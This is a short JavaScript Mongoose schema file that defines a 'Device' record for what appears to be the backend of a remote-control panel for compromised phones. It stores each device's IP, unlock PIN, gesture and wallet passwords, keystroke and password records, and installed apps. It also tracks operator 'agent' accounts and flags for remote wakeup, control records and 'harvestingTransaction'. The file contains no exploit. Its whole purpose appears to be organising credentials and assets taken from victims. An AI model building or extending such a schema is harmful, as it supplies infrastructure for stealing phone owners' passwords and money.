// backend/models/Device.js
const mongoose = require('mongoose');

const deviceSchema = new mongoose.Schema({
  deviceNumber: String,
  version: String,
  ipAddress: String,
  creationTime: Date,
  lastUpdateTime: Date,
  passwordInfo: {
    unlockScreen: Boolean,
    digitalUnlockPassword: String,
    gesturePassword: String,
    mixedPassword: String,
    walletPassword: String,
  },
  relatedRecords: {
    passwordRecord: String,
    keyboardRecord: String,
    applicationList: [String],
  },
  deviceBrand: {
    brand: String,
    model: String,
    version: String,
    notes: String,
  },
  userInfo: {
    agentAccount: String,
    agentNickname: String,
    loginTime: Date,
  },
  settings: {
    permissionsOpen: Boolean,
    autostartStatus: String, // "Manual" or "Auto"
  },
  openTimes: {
    totalOpened: Number,
    manualOpened: Number,
    autoOpened: Number,
  },
  operations: {
    remoteWakeup: Boolean,
    controlRecord: Boolean,
    harvestingTransaction: Boolean,
    batchImport: Boolean,
    assetRecord: Boolean,
  }
});

module.exports = mongoose.model('Device', deviceSchema);
